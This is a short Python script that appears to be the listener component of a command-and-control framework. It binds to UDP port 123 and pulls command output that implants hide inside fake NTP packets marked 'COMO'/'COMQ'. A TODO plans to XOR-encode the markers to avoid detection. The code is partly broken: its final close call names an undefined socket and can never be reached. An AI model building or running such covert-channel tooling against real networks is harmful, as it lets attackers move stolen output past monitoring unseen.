"""
sole purpose is to listen consistenty for NTP traffic
if resync is recieved, send to ntpserver.py
if cmdoutput is received, send to c2.py
"""
import socket


def start():
    while True:
        ip = "129.21.100.241" #TODO change to get my ip
        port = 123

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((ip, port))


        datahold,ip = "",""
        while True:
            data, addr = sock.recvfrom(2048)
            ip = addr[0]
            if "COMO".encode('utf-8') in data: #this means output, TODO change to encoded xored string
                strdata = data.decode('utf-8')
                idx = strdata.index("COM")
                datahold += strdata[idx+4:]
            elif "COMQ".encode('utf-8') in data:
                strdata = data.decode('utf-8')
                idx = strdata.index("COM")
                datahold += strdata[idx+4:]
                print("output", datahold)
                datahold = ""
            else:
                pass #this means resync

    s.close()


